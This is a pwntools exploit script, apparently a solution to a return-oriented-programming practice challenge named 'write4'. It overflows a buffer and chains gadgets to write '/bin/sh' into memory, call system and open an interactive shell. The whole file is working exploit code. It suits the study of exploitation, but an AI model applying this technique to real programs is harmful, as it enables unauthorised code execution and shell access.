from pwn import *

#0x0000000000400821 : mov dword ptr [rsi], edi ; ret
#0x0000000000400893 : pop rdi ; ret
#0x0000000000400891 : pop rsi ; pop r15 ; ret
r=process("./write4")
STR_ADDR=0x006010b0
CALL_SYSTEM=0x004005e0
SET_RDI=0x00400893
SET_RSI=0x00400891
RDI_TO_pRSI=0x00400821

exploit=b'A'*40
exploit+=p64(SET_RSI)
exploit+=p64(STR_ADDR)
exploit+=p64(0x41414141)
exploit+=p64(SET_RDI)
exploit+=b"/bin\x00\x00\x00\x00"
exploit+=p64(RDI_TO_pRSI)
exploit+=p64(SET_RDI)
exploit+=b"/sh\x00\x00\x00\x00\x00"
exploit+=p64(SET_RSI)
exploit+=p64(STR_ADDR+4)
exploit+=p64(0x41414141)
exploit+=p64(RDI_TO_pRSI)
exploit+=p64(SET_RDI)
exploit+=p64(STR_ADDR)
exploit+=p64(CALL_SYSTEM)

r.sendline(exploit)
r.interactive()


